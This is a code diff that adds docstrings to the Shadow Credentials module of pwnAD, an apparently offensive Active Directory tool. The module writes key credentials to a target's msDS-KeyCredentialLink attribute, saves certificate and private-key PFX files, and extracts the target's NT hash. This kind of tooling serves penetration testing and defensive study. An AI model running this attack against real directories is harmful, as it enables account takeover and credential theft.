@@ -21,6 +21,17 @@ from pwnAD.commands.getNThash import getNThash
 
 
 def get_key_credentials(conn, target_dn, target):
+    """
+    Retrieve Key Credentials from msDS-KeyCredentialLink attribute.
+
+    Args:
+        conn: LDAP connection object
+        target_dn: Distinguished Name of the target
+        target: sAMAccountName of the target
+
+    Returns:
+        List of raw Key Credential values, or None on error
+    """
     results = conn._ldap_connection.search(
         search_base=target_dn,
         search_filter="(objectClass=*)",
@@ -36,6 +47,17 @@ def get_key_credentials(conn, target_dn, target):
     return result
 
 def set_key_credentials(conn, target_dn, key_credential):
+    """
+    Set Key Credentials on a target object.
+
+    Args:
+        conn: LDAP connection object
+        target_dn: Distinguished Name of the target
+        key_credential: List of Key Credential values to set
+
+    Returns:
+        True on success, False on error
+    """
     try:
         conn._ldap_connection.modify(target_dn,{"msDS-KeyCredentialLink": [ldap3.MODIFY_REPLACE, key_credential]},)
         return True
@@ -45,6 +67,16 @@ def set_key_credentials(conn, target_dn, key_credential):
         return False
 
 def generate_key_credential(target_dn: str, subject: str) -> Tuple[X509Certificate2, KeyCredential, str]:
+    """
+    Generate a certificate and Key Credential for Shadow Credentials attack.
+
+    Args:
+        target_dn: Distinguished Name of the target
+        subject: Certificate subject (limited to 64 chars)
+
+    Returns:
+        Tuple of (certificate, key_credential, device_id)
+    """
     logging.info("Generating certificate")
 
     if len(subject) >= 64:
@@ -73,6 +105,17 @@ def generate_key_credential(target_dn: str, subject: str) -> Tuple[X509Certifica
     return (cert, key_credential, device_id)
 
 def add_new_key_credential(conn, target_dn, target) -> Tuple[X509Certificate2, KeyCredential, List[bytes], str]:
+    """
+    Add a new Key Credential to a target preserving existing ones.
+
+    Args:
+        conn: LDAP connection object
+        target_dn: Distinguished Name of the target
+        target: sAMAccountName of the target
+
+    Returns:
+        Tuple of (cert, new_key_credential, saved_key_credential, device_id) or None on error
+    """
     cert, key_credential, device_id = generate_key_credential(target_dn, f"CN={target}")
 
     logging.debug("Key Credential: %s" % key_credential.toDNWithBinary().toString())
@@ -95,12 +138,34 @@ def add_new_key_credential(conn, target_dn, target) -> Tuple[X509Certificate2, K
     return (cert, new_key_credential, saved_key_credential, device_id)
 
 def get_key_and_certificate(cert: X509Certificate2) -> Tuple[rsa.RSAPrivateKey, x509.Certificate]:
+    """
+    Extract RSA key and X.509 certificate from X509Certificate2 object.
+
+    Args:
+        cert: X509Certificate2 object
+
+    Returns:
+        Tuple of (rsa_private_key, x509_certificate)
+    """
     key = der_to_key(OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_ASN1, cert.key))
     cert = der_to_cert(OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_ASN1, cert.certificate))
 
     return (key, cert)
 
 def auto(conn, target):
+    """
+    Shadow Credentials attack: add Key Credential, extract NT hash, restore.
+
+    Args:
+        conn: LDAP connection object
+        target: sAMAccountName of the target user
+
+    Returns:
+        str: NT hash on success, False on error
+
+    Note:
+        Automatically cleans up by restoring original Key Credentials
+    """
     if conn.exists(target) is False:
         logging.error("Targeted user doesn't exist")
         return False
@@ -131,6 +196,19 @@ def auto(conn, target):
     return authenticate.nthash
 
 def add(conn, target):
+    """
+    Add a Key Credential and save certificate/key to PFX file.
+
+    Args:
+        conn: LDAP connection object
+        target: sAMAccountName of the target user
+
+    Returns:
+        False on error
+
+    Note:
+        Saves <target>.pfx file with certificate and private key
+    """
     if conn.exists(target) is False:
         logging.error("Targeted user doesn't exist")
         return False
@@ -153,6 +231,16 @@ def add(conn, target):
     logging.info(f"Saved certificate and private key to {out}")
 
 def list(conn, target):
+    """
+    List all Key Credentials for a target with DeviceID and creation time.
+
+    Args:
+        conn: LDAP connection object
+        target: sAMAccountName of the target
+
+    Returns:
+        True if successful (even if empty), False on error
+    """
     if conn.exists(target) is False:
         logging.error("Targeted user doesn't exist")
         return False
@@ -175,6 +263,16 @@ def list(conn, target):
         logging.info(f"DeviceID:{key_credential.DeviceId.toFormatD()} | Creation Time (UTC): {key_credential.CreationTime}")
 
 def clear(conn, target):
+    """
+    Clear all Key Credentials from a target.
+
+    Args:
+        conn: LDAP connection object
+        target: sAMAccountName of the target
+
+    Returns:
+        True on success, False on error
+    """
     if conn.exists(target) is False:
         logging.error("Targeted user doesn't exist")
         return False
@@ -191,6 +289,17 @@ def clear(conn, target):
     return result
 
 def remove(conn, target, device_id):
+    """
+    Remove a specific Key Credential by DeviceID.
+
+    Args:
+        conn: LDAP connection object
+        target: sAMAccountName of the target
+        device_id: DeviceID of the Key Credential to remove
+
+    Returns:
+        True on success, False on error
+    """
     if device_id is None:
         logging.error("A device ID (-device-id) is required for the remove operation")
         return False
@@ -235,6 +344,17 @@ def remove(conn, target, device_id):
         return False
 
 def info(conn, target, device_id):
+    """
+    Display detailed information about a specific Key Credential.
+
+    Args:
+        conn: LDAP connection object
+        target: sAMAccountName of the target
+        device_id: DeviceID of the Key Credential
+
+    Returns:
+        True if found, False on error or not found
+    """
     if device_id is None:
         logging.error("A device ID (-device-id) is required for the info operation")
         return False
